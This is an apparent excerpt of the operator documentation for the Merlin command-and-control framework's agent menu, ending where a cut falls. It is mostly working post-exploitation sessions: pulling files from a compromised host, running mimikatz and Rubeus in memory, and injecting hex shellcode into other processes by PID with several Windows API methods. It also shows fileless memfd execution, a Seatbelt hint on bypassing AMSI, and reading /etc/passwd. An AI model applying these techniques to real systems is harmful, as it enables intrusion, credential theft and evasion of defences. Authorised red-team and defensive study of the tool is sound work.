###########
Agent Menu
###########

The agent menu context is used to interact with a single agent. The Merlin prompt will include the word ``agent`` along with the identifier for the selected agent. Type ``help`` to see a list of available commands for the agent menu context.

help
----

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» help

           COMMAND      |          DESCRIPTION           |            OPTIONS
    +-------------------+--------------------------------+--------------------------------+
      cd                | Change directories             | cd ../../ OR cd c:\\Users
      clear             | Clear any UNSENT jobs from the |
                        | queue                          |
      cmd               | Execute a command on the agent | cmd ping -c 3 8.8.8.8
                        | (DEPRECIATED)                  |
      back              | Return to the main menu        |
      download          | Download a file from the agent | download <remote_file>
      execute-assembly  | Execute a .NET 4.0 assembly    | execute-assembly <assembly
                        |                                | path> [<assembly args>,
                        |                                | <spawnto path>, <spawnto
                        |                                | args>]
      execute-pe        | Execute a Windows PE (EXE)     | execute-pe <pe path> [<pe
                        |                                | args>, <spawnto path>,
                        |                                | <spawnto args>]
      execute-shellcode | Execute shellcode              | self, remote <pid>,
                        |                                | RtlCreateUserThread <pid>
      info              | Display all information about  |
                        | the agent                      |
      invoke-assembly   | Invoke, or execute, a .NET     | <assembly name>, <assembly
                        | assembly that was previously   | args>
                        | loaded into the agent's        |
                        | process                        |
      jobs              | Display all active jobs for    |
                        | the agent                      |
      kill              | Instruct the agent to die or   |
                        | quit                           |
      load-assembly     | Load a .NET assembly into the  | <assembly path> [<assembly
                        | agent's process                | name>]
      list-assemblies   | List the .NET assemblies that  |
                        | are loaded into the agent's    |
                        | process                        |
      ls                | List directory contents        | ls /etc OR ls C:\\Users OR ls
                        |                                | C:/Users
      main              | Return to the main menu        |
      memfd             | Execute Linux file in memory   | <file path> [<arguments>]
      nslookup          | DNS query on host or ip        | nslookup 8.8.8.8
      pwd               | Display the current working    | pwd
                        | directory                      |
      run               | Execute a program directly,    | run ping -c 3 8.8.8.8
                        | without using a shell          |
      set               | Set the value for one of the   | ja3, killdate, maxretry,
                        | agent's options                | padding, skew, sleep
      sharpgen          | Use SharpGen to compile and    | sharpgen <code> [<spawnto
                        | execute a .NET assembly        | path>, <spawnto args>]
      shell             | Execute a command on the agent | shell ping -c 3 8.8.8.8
                        | using the host's default shell |
      status            | Print the current status of    |
                        | the agent                      |
      upload            | Upload a file to the agent     | upload <local_file>
                        |                                | <remote_file>
      *                 | Anything else will be execute  |
                        | on the host operating system   |
    Agent Help Menu

cd
--

The ``cd`` command is used to change the current working directory the Merlin agent is using. Relative paths can be used (e.g.,. ``./../`` or ``downloads\\Merlin``). This command uses native Go and will not execute the ``cd`` binary program found on the host operating system.

| The ``\`` in a Windows directory must be escaped like ``C:\\Windows\\System32``.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» cd /usr/bin
    [-]Created job evtawDqBWa for agent a98e6175-7799-47fb-abf0-32534a9191f0 at 2019-02-27T01:03:57Z
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job evtawDqBWa at 2019-02-27T01:03:59Z
    Changed working directory to /usr/bin

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» cd "C:\\Program Files (x86)\\"
    [-]Created job gwFQhcsKJi for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2019-02-27T01:17:26Z
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job gwFQhcsKJi at 2019-02-27T01:17:30Z
    Changed working directory to C:\Program Files (x86)

clear
-----

The ``clear`` command will cancel all jobs in the queue that have not been sent to the agent yet.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» clear
    [+] jobs cleared for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

back
----

The ``back`` command is used to leave the Agent menu and return back to the :doc:`main`.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» back
    Merlin»

download
--------

The ``download`` command is used to download a file from the host where the agent is running back to the Merlin server. The file will be automatically saved in a folder with a name of the agent's identifier in the `data\agents\c1090dbc-f2f7-4d90-a241-86e0c0217786` directory.

.. note::
    Because ``\`` is used to escape a character, file paths require two (e.g., ``C:\\Windows``)

.. note::
    Enclose file paths containing a space with quotation marks (e.g.,. ``"C:\\Windows\\Program Files\\"``)

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» download C:\\Windows\\hh.exe
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job NXnhJVRUSP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [+]Results for job NXnhJVRUSP
    [+]Successfully downloaded file C:\Windows\hh.exe with a size of 17920 bytes from agent to C:\merlin\data\agents\c1090dbc-f2f7-4d90-a241-86e0c0217786\hh.exe
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»

exit
----

The ``exit`` command is used to quit the Merlin server. The user will be prompted for confirmation to prevent from accidentally quitting the program. The confirmation prompt can be skipped with ``exit -y``.

.. code-block:: text

    Merlin» exit

    Are you sure you want to exit? [yes/NO]:
    yes
    [!]Quitting...

execute-assembly
-----------------

The ``execute-assembly`` command uses `go-donut <https://github.com/Binject/go-donut>`_ to convert a .NET assembly into shellcode and then uses the ``windows/x64/go/exec/createProcess`` Merlin module to execute the shellcode.

Currently this command only supports .NET v4.0 assemblies. For more granular control, use the ``windows/x64/go/exec/donut`` module.

The command is executed as: ``execute-assembly <assembly path> [<assembly args> <spawnto path> <spawnto args>]``

The command requires the file path to the assembly you wish to execute in the ``<assembly path>`` argument. All other arguments are optional. The ``<spawnto path>`` argument is the process that will be started on the target and where the shellcode will be injected and executed. If a ``<spawnto path>`` is not provided, ``C:\WIndows\System32\dllhost.exe`` will be used. The ``<spawnto args>`` value is used as an argument when starting the spawnto process.

.. note::
    Because ``\`` is used to escape a character, file paths require two (e.g., ``C:\\Windows``)

.. note::
    Use quotes to enclose multiple arguments for ``<assembly args>`` (e.g., ``execute-assembly Seatbelt.exe "LocalGroups LocalUsers"``)

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly Seatbelt.exe "DotNet IdleTime" "C:\\Windows\\System32\\WerFault.exe" /?
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-] Created job dmAfzDPUsM for agent c1090dbc-f2f7-4d90-a241-86e0c0217786


    [+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job dmAfzDPUsM



                            %&&@@@&&
                            &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                            &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
    %%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
    #%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
    #%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
    #####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
    #######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
    ###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
    #####%######################  %%%..                       @////(((&%%%%%%%################
                            &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                            &%%&&&%%%%%        v1.1.0         ,(((&%%%%%%%%%%%%%%%%%,
                             #%%%%##,


    ====== DotNet ======

      Installed CLR Versions
          2.0.50727
          4.0.30319

      Installed .NET Versions
          3.5.30729.4926
          4.8.03752

      Anti-Malware Scan Interface (AMSI)
          OS supports AMSI           : True
         .NET version support AMSI   : True
            [!] The highest .NET version is enrolled in AMSI!
            [*] You can invoke .NET version 3.5 to bypass AMSI.
    ====== IdleTime ======

      CurrentUser : DESKTOP-H35RK21\rastley
      Idletime    : 00h:06m:02s:766ms (362766 milliseconds)



    [*] Completed collection in 0.122 seconds

execute-pe
-----------------

The ``execute-pe`` command uses `go-donut <https://github.com/Binject/go-donut>`_ to convert a Windows Portable Executable (PE), commonly an .exe, into shellcode and then uses the ``windows/x64/go/exec/createProcess`` Merlin module to execute the shellcode.

The command is executed as: ``execute-pe <pe path> [<pe args> <spawnto path> <spawnto args>]``

The command requires the file path to the PE you wish to execute in the ``<pe path>`` argument. All other arguments are optional. The ``<spawnto path>`` argument is the process that will be started on the target and where the shellcode will be injected and executed. If a ``<spawnto path>`` is not provided, ``C:\WIndows\System32\dllhost.exe`` will be used. The ``<spawnto args>`` value is used as an argument when starting the spawnto process.

.. note::
    Because ``\`` is used to escape a character, file paths require two (e.g., ``C:\\Windows``)

.. note::
    Use quotes to enclose multiple arguments for ``<pe args>`` (e.g., ``execute-pe mimikatz.exe "coffee exit"``)

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe mimikatz.exe "coffee exit" C:\\Windows\\System32\\WerFault.exe Testing
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-] Created job BSvJZFvbRZ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786


    [+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job BSvJZFvbRZ


      .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

    mimikatz(commandline) # coffee

        ( (
         ) )
      .______.
      |      |]
      \      /
       `----'

    mimikatz(commandline) # exit
    Bye!


execute-shellcode
-----------------

The ``execute-shellcode`` command is used to have the Agent execute the provided shellcode. This command became available in version ``0.6.4`` and is only supported for Windows agents.

The ``execute-shellcode`` command takes the shellcode you want to execute at the last argument. Shellcode can be provided using an absolute filepath or by pasting it directly into the terminal in one of the following formats:
  * Hex (e.g.,. `5051525356`)
  * ``0x50, 0x51, 0x52, 0x53, 0x56`` with or without spaces and commas
  * ``\x50\x51\x52\x53\x56``
  * Base64 encoded version of the above formats
  * A file containing any of the above formats or just a raw byte file

.. warning::
    Shellcode injection and execution could cause a process to crash so choose wisely

.. note::
    If Cobalt Strike's Beacon is injected using one of these methods, exiting the Beacon will cause the process to die too.

The agent can execute shellcode using one of the following methods:
  * self_
  * remote_
  * RtlCreateUserThread_
  * UserAPC_

.. _self:

self
^^^^

The ``self`` method allocates space within the Merlin Agent process and executes the shellcode.

Syntax is ``execute-shellcode self <SHELLCODE>``

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode self 505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3
    [-]Created job joQNJONrEK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job joQNJONrEK
    [+]Shellcode executed successfully


remote
^^^^^^

The ``remote`` method creates a thread in another process using the `CreateRemoteThreadEx <https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethreadex>`_ Windows API call.

Syntax is ``execute-shellcode remote <PID> <SHELLCODE>`` where PID is the Process ID you want to execute the shellcode under.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode remote 6560 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
    [-]Created job PRumZQYBFR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job PRumZQYBFR
    [+]Shellcode executed successfully

.. _RtlCreateUserThread:

RtlCreateUserThread
^^^^^^^^^^^^^^^^^^^

The ``rtlcreateuserthread`` method creates a thread in another process using the undocumented `RtlCreateUserThread <http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FRtlCreateUserThread.html>`__ Windows API call.

Syntax is ``execute-shellcode rtlcreateuserthread <PID> <SHELLCODE>`` where PID is the Process ID you want to execute the shellcode under.

Example:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode RtlCreateUserThread 6560 \x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x83\xEC\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x30\x5D\x5F\x5E\x5B\x5A\x59\x58\xC3
    [-]Created job CCWrmdLIFQ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job CCWrmdLIFQ
    [+]Shellcode executed successfully

UserAPC
^^^^^^^

.. _UserAPC:

The ``userapc`` method creates a thread in another process using the `QueueUserAPC <https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-queueuserapc>`__ Windows API call.

Syntax is ``execute-shellcode userapc <PID> <SHELLCODE>`` where PID is the Process ID you want to execute the shellcode under.

.. note::
    This method is highly unstable and therefore was intentionally not added to the tab completion list of available methods. The current implementation requires the process to have more than 1 thread. All remaining threads will have a user-mode APC queued to execute the shellcode and could result in multiple instances of execution. This method frequently causes processes to crash. Additionally, the shellcode might not execute at all if none of the threads were in an alertable state. The ``svchost.exe`` process usually provides a little better choice, but still not guaranteed.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode userapc 4824 /home/rickastley/calc.bin
    [-]Created job NPQGRntaQX for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job NPQGRntaQX
    [+]Shellcode executed successfully

info
----

The ``info`` command is used to get information about a specific agent.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» info

    +---------------------------+-----------------------------------------------+
    | ID                        | c1090dbc-f2f7-4d90-a241-86e0c0217786          |
    | Platform                  | windows                                       |
    | Architecture              | amd64                                         |
    | UserName                  | ACME\Dade                                     |
    | User GUID                 | S-1-5-21-988272595-2747325887-1861723304-1002 |
    | Hostname                  | WIN-7PD32                                     |
    | Process ID                | 4120                                          |
    | IP                        | [fe80::8893:b524:821:31ba/64                  |
    |                           | 169.254.49.186/16                             |
    |                           | 192.168.1.104/24 fe80::fd43:1a37:b31b:9788/64 |
    | Initial Check In          | 2017-11-22 11:36:47.4171802 -0500 EST         |
    |                           | m=+7.606503201                                |
    | Last Check In             | 2017-11-22 12:26:50.1984432 -0500 EST         |
    |                           | m=+3010.387766201                             |
    | Agent Version             | 0.5.0 Beta                                    |
    | Agent Build               | nonRelease                                    |
    | Agent Wait Time           | 30s                                           |
    | Agent Wait Time Skew      | 5                                             |
    | Agent Message Padding Max | 4096                                          |
    | Agent Max Retries         | 7                                             |
    | Agent Kill Date           | 1970-01-01T00:00:00Z                          |
    | Agent Failed Logins       | 0                                             |
    +---------------------------+-----------------------------------------------+

invoke-assembly
---------------

The ``invoke-assembly`` command will execute a .NET assembly that was previously loaded into the agent with the
load-assembly_ command. The first argument is the name of the assembly and all the remaining arguments are passed to
the assembly for execution. Use the list-assemblies_ command return a list of loaded assemblies.
The execute-assembly_ command is different because it uses injection to run the assembly in a child process.
This command runs the assembly in the current process without injection.

.. note::
    Only CLR v4 is currently supported which can be used to execute both v3.5 and v4 .NET assemblies

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly Rubeus.exe klist
    [-] Created job GlPHKaRtmg for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job GlPHKaRtmg for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+]
       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/

      v1.5.0


    Action: List Kerberos Tickets (Current User)

    [*] Current LUID    : 0x37913

jobs
----

The ``jobs`` command will display a table of all active jobs assigned to the agent. The output will not include jobs that have already completed.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» jobs

          ID     | STATUS  |     TYPE     |       CREATED        |         SENT
    +------------+---------+--------------+----------------------+----------------------+
      whFGRWHudV | Sent    | NativeCmd    | 2020-12-18T11:45:07Z | 2020-12-18T11:45:38Z
      UxegCkyROR | Sent    | AgentControl | 2020-12-18T11:45:11Z | 2020-12-18T11:45:38Z
      YqhfUvxkqZ | Created | CmdPayload   | 2020-12-18T11:45:44Z |


kill
----

The ``kill`` control type instructs the agent to exit or die. There is no response on the CLI after the instruction has been provided to the agent. This command is also an alias for agent -> control -> <agent ID> -> kill. This is the shortest way to quickly kill an agent.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» kill
    Merlin» [-]Created job goaRNhTVTT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

list-assemblies
---------------

The ``list-assemblies`` command lists .NET assemblies that have been loaded into the agent's process with the load-assembly_ command.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» list-assemblies
    [-] Created job NIflRstGrR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job NIflRstGrR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Loaded Assemblies:
    seatbelt.exe
    rubeus.exe
    sharpdpapi.exe
    sharpup.exe
    Hagrid

load-assembly
-------------

The ``load-assembly`` command loads a .NET assembly into the agent's process. Once the assembly is loaded, it can be executed
multiple times with the invoke-assembly_ command. The .NET assembly is only sent across the wire one time.
An option third argument can be provided to reference the assembly as any other name when executed with the
invoke-assembly_ command.

.. note::
    Only CLR v4 is currently supported which can be used to execute both v3.5 and v4 .NET assemblies

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /root/Rubeus.exe
    [-] Created job iQOkWgGqkJ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job iQOkWgGqkJ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] successfully loaded rubeus.exe into the default AppDomain

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /root/Rubeus.exe Hagrid
    [-] Created job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [-] Results job YrPdQkcuTG for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] successfully loaded Hagrid into the default AppDomain

ls
--

The ``ls`` command is used to list a directory's contents using native Go functions within Merlin. This command will not execute the ``ls`` or ``dir`` binary programs found on their associated host operating systems. If a directory is not specified, Merlin will list the contents of the current working directory. When specifying a Windows path, you must escape the backslash (e.g.,. `C:\\Temp`). Wrap file paths containing a space in quotations. Alternatively, Linux file paths with a space can be called without quotes by escaping the space (e.g.,. ``/root/some\ folder/``). Relative paths can be used (e.g.,. ``./../`` or ``downloads\\Merlin``) and they are resolved to their absolute path.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls /var
    [-]Created job eNJKIiLXXH for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job eNJKIiLXXH
    Directory listing for: /var

    drwxr-xr-x      2019-02-06 00:05:17     4096    backups
    drwxr-xr-x      2018-12-24 14:40:14     4096    cache
    dgtrwxrwxrwx    2019-02-06 00:05:16     4096    crash
    drwxr-xr-x      2019-01-17 21:24:30     4096    lib
    dgrwxrwxr-x     2018-04-24 04:34:22     4096    local
    Lrwxrwxrwx      2018-11-07 21:33:01     9       lock
    drwxrwxr-x      2019-02-06 00:05:39     4096    log
    dgrwxrwxr-x     2018-07-24 23:03:56     4096    mail
    dgtrwxrwxrwx    2018-07-24 23:09:50     4096    metrics
    drwxr-xr-x      2018-07-24 23:03:56     4096    opt
    Lrwxrwxrwx      2018-11-07 21:33:01     4       run
    drwxr-xr-x      2018-11-07 21:45:43     4096    snap
    drwxr-xr-x      2018-11-07 21:38:04     4096    spool
    dtrwxrwxrwx     2019-02-06 00:05:38     4096    tmp

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls "C:\\Program Files (x86)\\"
    [-]Created job ggQPFQhTrC for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job ggQPFQhTrC
    Directory listing for: C:\Program Files (x86)

    drwxrwxrwx      2018-09-15 00:42:33     0       Common Files
    drwxrwxrwx      2018-09-15 02:08:27     0       Internet Explorer
    drwxrwxrwx      2018-09-15 00:33:50     0       Microsoft.NET
    drwxrwxrwx      2018-09-15 02:07:46     0       Windows Defender
    drwxrwxrwx      2018-12-27 12:42:42     0       Windows Kits
    drwxrwxrwx      2018-09-15 00:33:53     0       Windows Mail
    drwxrwxrwx      2018-12-16 13:15:58     0       Windows Media Player
    drwxrwxrwx      2018-09-15 02:10:06     0       Windows Multimedia Platform
    drwxrwxrwx      2019-01-10 08:18:11     0       Windows Photo Viewer
    drwxrwxrwx      2018-09-15 02:10:06     0       Windows Portable Devices
    drwxrwxrwx      2018-09-15 00:33:50     0       Windows Sidebar
    drwxrwxrwx      2018-09-15 00:33:50     0       WindowsPowerShell
    -rw-rw-rw-      2018-09-15 00:31:34     174     desktop.ini
    drwxrwxrwx      2018-09-15 00:42:33     0       windows nt

main
----

The ``main`` command is used to leave the Agent menu and return back to the :doc:`main`. It is an alias for the ``back`` command.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» main
    Merlin»

memfd
-----

The ``memfd`` command loads a Linux executable file into memory (RAM) as an anonymous file using the
`memfd_create <https://man7.org/linux/man-pages/man2/memfd_create.2.html>`__ API call, executes it, and returns the
results.
The file is created with an empty string as its name.
Less the fact that RAM is a file on Linux, the executable is not written to disk.
View the `Detecting Linux memfd_create() Fileless Malware with Command Line Forensics
<https://www.sandflysecurity.com/blog/detecting-linux-memfd_create-fileless-malware-with-command-line-forensics/>`__
for detection guidance.

.. note::
    This command will not run on Windows agents

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memfd /tmp/hello.py
    [-] Created job ZyeWhgfThk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job ZyeWhgfThk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Hello from a Python script


nslookup
--------

The ``nslookup`` command takes a space separated list of IP addresses or hostnames and performs a DNS query using the
host's resolver and returns the results.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» nslookup 8.8.8.8 9.9.9.9 github.com google.com
    [-] Created job fQilcQFmlk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job fQilcQFmlk for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Query: 8.8.8.8, Result: dns.google.
    Query: 9.9.9.9, Result: dns9.quad9.net.
    Query: github.com, Result: 192.30.255.113
    Query: google.com, Result: 142.250.73.238 2607:f8b0:4004:82a::200e

pwd
---

The ``pwd`` command uses native Go to get and return the current working directory.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pwd
    [-]Created job JweUayTyTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [-] Results job JweUayTyTv for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Current working directory: C:\Users\Joe

quit
----

The ``quit`` command is used to exit out of the Merlin Server application. This is also an alias for the ``exit`` command.

run
---

The ``run`` command is used to task the agent to run a program on the host and return STDOUT/STDERR. When issuing a command to an agent from
the server, the agent will execute the provided binary file for the program you specified and also pass along any
arguments you provide. It is important to note that program must be in the path. This allows an operator to specify and
use a shell (e.g.,. cmd.exe, powershell.exe, or /bin/bash) or to execute the program directly *WITHOUT* a shell.
For instance, ``ping.exe`` is typically in the host's %PATH% variable on Windows and works *without* specifying ``cmd.exe``.
However, the ``ver`` command is not an executable in the %PATH% and therefore *must* be run from ``cmd.exe``.
Use the shell_ command if you want to use the operating system's default shell directly.

Example using ping:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run ping 8.8.8.8
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job DTBnkIfnus for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [+]Results for job DTBnkIfnus

    Pinging 8.8.8.8 with 32 bytes of data:
    Reply from 8.8.8.8: bytes=32 time=23ms TTL=54
    Reply from 8.8.8.8: bytes=32 time=368ms TTL=54
    Reply from 8.8.8.8: bytes=32 time=26ms TTL=54
    Reply from 8.8.8.8: bytes=32 time=171ms TTL=54

    Ping statistics for 8.8.8.8:
        Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
    Approximate round trip times in milli-seconds:
        Minimum = 23ms, Maximum = 368ms, Average = 147ms

Example running ``ver`` *without* ``cmd.exe``:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run ver
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job iOMPERNYGT for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [+]Results for job iOMPERNYGT
    exec: "ver": executable file not found in %PATH%

Example running ``ver`` *with* ``cmd.exe``:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c ver
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job IxVXgyIkhS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [+]Results for job IxVXgyIkhS

    Microsoft Windows [Version 10.0.16299.64]

Shell Functions
^^^^^^^^^^^^^^^

Some commands and capabilities are components of a shell and can *ONLY* be used with a shell.
For example, the ``dir`` command is a component of ``cmd.exe`` and is not its own program executable.
Therefore, ``dir`` can only be used within the ``cmd.exe`` shell.
In order to use the `dir`, you must provide executable of the shell environment where that command resides.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c dir

The pipe and redirection characters ``|`` , ``>`` , and ``<`` , are also functions of a shell environment.
If you want to use them, you must do so *WITH* a shell.
For Linux, an example would be:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»run bash -c "cat /etc/passwd | grep root"

Quoted Arguments
^^^^^^^^^^^^^^^^

When running a command on an agent from the server, the provided arguments are passed to executable that was called.
As long as there are no special characters (e.g., ``\`` , ``&`` , ``;`` , ``|`` , ``>`` , ``<`` etc.) the command will be processed fine.

For example, this command will work fine because it does not have any special characters:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe Get-Service -Name win* -Exclude WinRM

However, this command **WILL** fail because of the ``|`` symbol. The command will still execute, but will stop processing everything after the ``|`` symbol.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe Get-Service -Name win* -Exclude WinRM | fl

To circumvent this, enclose the entire argument in quotes. The outer most quotes will be removed when the arguments are
passed. Any inner quotes need to be escaped. The argument can be enclosed in double quotes or single quotes.
The command be executed in both of these ways:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe "Get-Service -Name win* -Exclude WinRM | fl"

**OR**

.. code-block:: text

